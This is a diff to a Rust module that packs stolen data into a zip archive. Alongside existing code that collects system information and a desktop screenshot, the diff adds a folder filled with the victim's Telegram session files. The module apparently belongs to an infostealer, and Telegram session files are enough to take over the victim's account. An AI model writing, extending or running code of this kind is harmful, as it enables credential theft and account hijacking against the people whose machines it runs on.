@@ -3,7 +3,7 @@ pub mod zip_md
 	// PACKAGES
 	use std::fs;
 	use std::fs::File;
-	use std::io::prelude::*;
+	use std::path::Path;
 	use zip::write::FileOptions;
 	use zip::write::ZipWriter;
 
@@ -20,7 +20,10 @@ pub mod zip_md
 			.unix_permissions(0o755);
 
 
-		//ADD A OS-INFO TO THE ZIP FOLDER
+		zip.start_file(format!("{}/", "telegram-session"), options)?;
+
+
+		//ADDS A OS-INFO TO THE ZIP FOLDER
 		{
 			fs::File::create("info.txt").expect("info.txt didn't created");
 			fs::write("info.txt", crate::sysinfo::sysinfo_md::start()).expect("Unable to write file");
@@ -32,7 +35,7 @@ pub mod zip_md
 			fs::remove_file("info.txt");
 		}
 
-		//ADD A DESKTOP'S SCREENSHOT TO THE ZIP FOLDER
+		//ADDS A DESKTOP'S SCREENSHOT TO THE ZIP FOLDER
 		{
 			crate::screen::screen_md::start();
 
@@ -42,7 +45,23 @@ pub mod zip_md
 
 			fs::remove_file("screen-1.png");
 		}
-		
+
+		// ADDS A FOLDER WHICH CONTAIN TELEGRAM'S SESSIONS
+		{
+			let files: Vec<String> = crate::session::telegram_md::start();
+
+			for x in files
+			{
+				if let Some(nm) = Path::new(&x).file_name() {
+					let name = nm.to_string_lossy();
+					
+					zip.start_file(format!("telegram-session/{}", name), options)?;
+					let mut file_content = File::open(x)?;
+					std::io::copy(&mut file_content, &mut zip)?;
+				}
+			}
+		}		
+
 
 		zip.finish()?;
 		println!("Zip folder created successfully.");
